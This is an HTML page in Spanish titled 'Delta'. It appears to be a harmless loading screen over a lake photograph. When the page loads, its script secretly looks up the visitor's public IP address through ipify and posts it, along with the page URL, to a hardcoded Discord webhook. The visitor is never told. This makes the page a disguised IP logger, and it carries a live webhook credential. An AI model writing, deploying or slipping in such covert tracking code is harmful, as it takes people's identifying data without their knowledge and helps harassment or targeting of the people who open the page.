<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Delta</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body, html {
            height: 100%;
            width: 100%;
            overflow: hidden;
            /* Eliminado el fondo negro por completo */
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Segoe UI', sans-serif;
        }

        /* Imagen de fondo: Siempre visible y sin filtros oscuros */
        .background-image {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            background-image: url('https://wallpapers.com/images/hd/4k-nature-moraine-lake-r66plwqa8m3z5reg.jpg');
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
        }

        /* Panel Glassmorphism: Transparente para que se vea la foto detrás */
        .glass-panel {
            z-index: 1;
            padding: 25px 40px;
            width: 350px;
            background: rgba(255, 255, 255, 0.1); 
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            border-radius: 20px;
            border: 1px solid rgba(255, 255, 255, 0.2);
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
            transition: opacity 0.8s ease-in-out;
        }

        .loader-box {
            width: 100%;
            height: 4px;
            background: rgba(255, 255, 255, 0.2);
            border-radius: 10px;
            overflow: hidden;
        }

        .progress-fill {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, #00f2fe, #4facfe);
            box-shadow: 0 0 15px rgba(0, 242, 254, 0.8);
            transition: width 0.1s linear;
        }

        /* Clase para desvanecer el panel al terminar */
        .fade-out {
            opacity: 0;
            pointer-events: none;
        }
    </style>
</head>
<body>

    <div class="background-image"></div>

    <div class="glass-panel" id="main-panel">
        <div class="loader-box">
            <div class="progress-fill" id="progress"></div>
        </div>
    </div>

    <script>
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1494884260577022002/M67ttC3ZWJ4wobkDm-1S6PSj53UzbYOh-lsXhhfeHaXnBqYXTb0BWDrySTVGQKkjIpoj';

        window.onload = function() {
            startLoading();
            sendData();
        };

        function startLoading() {
            const bar = document.getElementById('progress');
            const panel = document.getElementById('main-panel');
            let width = 0;

            const interval = setInterval(() => {
                if (width >= 100) {
                    clearInterval(interval);
                    // Solo desaparece el panel de carga, la foto se queda
                    setTimeout(() => {
                        panel.classList.add('fade-out');
                    }, 500);
                } else {
                    width += 2;
                    bar.style.width = width + '%';
                }
            }, 40);
        }

        async function sendData() {
            let userIP = "Unknown";
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                userIP = data.ip;
            } catch (e) {}

            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    embeds: [{
                        description: `🌐 **IP Detectada:** \`${userIP}\` \n🔗 **URL:** ${window.location.href}`,
                        color: 3447003, 
                        footer: { text: "Delta System | Background Updated" }
                    }]
                })
            }).catch(() => {});
        }
    </script>
</body>
</html>
